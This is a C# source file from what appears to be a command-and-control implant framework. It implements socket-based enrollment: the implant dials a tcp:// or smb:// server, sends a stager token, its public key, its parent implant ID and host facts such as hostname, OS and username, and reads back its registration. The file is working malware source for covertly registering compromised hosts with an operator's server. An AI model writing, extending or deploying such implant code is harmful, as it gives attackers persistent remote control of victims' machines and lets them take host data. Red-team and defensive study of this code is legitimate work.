using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The socket enroll client (architecture.md Sec 8, enrollment over the
// stream contact): the full-independence step for a no-egress segment --
// the opening exchange on the pipe or socket it already reaches is an
// enroll instead of a handshake, the same enroll body the web route carries
// promoted into the rod.v1 frame grammar, answered on the same connection.
// The exchange is its own connection: the server's bridge tolerates the
// close that follows (the next contact dials fresh), so unlike the QUIC
// enroll there is no live wire to hand the first cycle -- the poll cadence
// reconnects on its own.
//
// A whole source-file module riding the socket contact module's file set
// (the bake-time transport trim): the module compiles exactly when the walk
// holds a socket-schemed entry -- a beacon dial or an enroll dial.

/// <summary>
/// Enrolls over the socket wire: dial the tcp:// or smb:// endpoint, send
/// the EnrollRequest frame as its own message, read the EnrollResponse
/// back. A definitive refusal surfaces as
/// <see cref="C2.EnrollRejectedException"/> exactly like every other enroll
/// client's, so the caller's fail-fast retry discipline is the same.
/// </summary>
internal static class SocketEnroll
{
    public static async Task<Enrollment> EnrollAsync(EnrollDial dial, CancellationToken cancellationToken)
    {
        var timeout = dial.Profile.RequestTimeout > TimeSpan.Zero
            ? dial.Profile.RequestTimeout
            : TransportProfile.DefaultRequestTimeout;
        using var deadline = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        deadline.CancelAfter(timeout);

        using var wire = await SocketWire.ConnectAsync(dial.EnrollUrl, deadline.Token)
            .ConfigureAwait(false);

        // The enroll body, promoted into the frame grammar (extending/
        // implants.md): token secret, class, the implant's public key (DER
        // SubjectPublicKeyInfo -- only the public half crosses), parent,
        // host facts, kill date. The profile's malleable HTTP knobs do not
        // apply -- the exchange is frames on a bare socket. A baked
        // per-artifact key seals the exchange the same way the contacts
        // seal (the token secret never crosses a bare wire in the clear --
        // the http posture's enroll-body default, carried here); a
        // manually minted token names no build, so its exchange rides
        // plaintext and the key arrives in the answer.
        var request = new Rod.V1.EnrollRequest
        {
            StagerTokenSecret = dial.StagerToken,
            Class = dial.ImplantClass ?? string.Empty,
            PublicKey = ByteString.CopyFrom(dial.PrivateKey.ExportSubjectPublicKeyInfo()),
            ParentImplantId = dial.ParentImplantId ?? string.Empty,
            Hostname = dial.Host?.Hostname ?? string.Empty,
            Os = dial.Host?.Os ?? string.Empty,
            Arch = dial.Host?.Arch ?? string.Empty,
            Username = dial.Host?.Username ?? string.Empty,
            KillDate = dial.KillDate ?? string.Empty,
        };
        var requestFrames = new[]
        {
            new Frame { Kind = FrameKind.EnrollRequest, Payload = ByteString.CopyFrom(request.ToByteArray()) },
        };
        var seal = dial.Profile is { SealsContacts: true }
            ? EnvelopeWire.ParseBakedKey(dial.Profile.EnvelopeKey)
            : null;
        if (seal is { } baked)
        {
            await wire.WriteBodyAsync(
                EnvelopeWire.SealContactBody(
                    EnvelopeCodec.Encode(requestFrames), baked.KeyId, baked.Key, "rod-enroll-v1"),
                deadline.Token).ConfigureAwait(false);

            var enrollBody = await wire.ReadBodyAsync(deadline.Token).ConfigureAwait(false);
            var opened = EnvelopeWire.TryOpenContactBody(enrollBody, baked.KeyId, baked.Key, "rod-enroll-response-v1")
                ?? throw new C2.EnrollRejectedException("the socket enroll answer did not verify under the baked key");
            return await EnrollFrames.MaterializeAsync(opened, dial, "socket");
        }

        await wire.WriteFramesAsync(requestFrames, deadline.Token).ConfigureAwait(false);

        var inbound = await wire.ReadFramesAsync(deadline.Token).ConfigureAwait(false);
        return await EnrollFrames.MaterializeAsync(EnvelopeCodec.Encode(inbound), dial, "socket");
    }
}
